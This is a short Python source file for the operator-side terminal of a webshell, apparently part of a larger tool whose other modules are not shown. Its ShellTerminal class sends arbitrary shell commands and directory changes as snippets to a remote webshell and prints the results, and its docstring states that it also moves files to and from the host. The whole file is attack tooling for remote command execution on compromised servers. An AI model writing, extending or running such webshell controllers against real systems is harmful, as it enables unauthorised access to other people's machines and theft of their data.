"""
 Author: Ido
 Date: 27/08/21
 Purpose: Be the shell context for the webshell, run shell commands, putfile and getfile
"""

import cmd2
from webshell_master_cmd import WebshellCmd
from snippets.snippet_handler import get_snippet
from communication import send_snippet


class ShellTerminal(WebshellCmd):
    """
    Be shell context for the webshell, run shell commands, putfile and getfile
    """

    def __init__(self):
        super(WebshellCmd, self).__init__()
        self.cwd = "."
        self.prompt = ".> "
        self.do_cd(cmd2.Statement("."))

    def default(self, statement: cmd2.Statement):
        snippet = get_snippet("system_command.snippet",
                              {"CURRENT_DIRECTORY": self.cwd, "SYSTEM_COMMAND": statement.raw})
        print(send_snippet(snippet))

    def do_cd(self, statement: cmd2.Statement):
        snippet = get_snippet("directory_change.snippet",
                              {"OLD_DIRECTORY": self.cwd, "DIRECTORY_CHANGE": statement.args})
        self.cwd = send_snippet(snippet)
        self.prompt = self.cwd + "> "
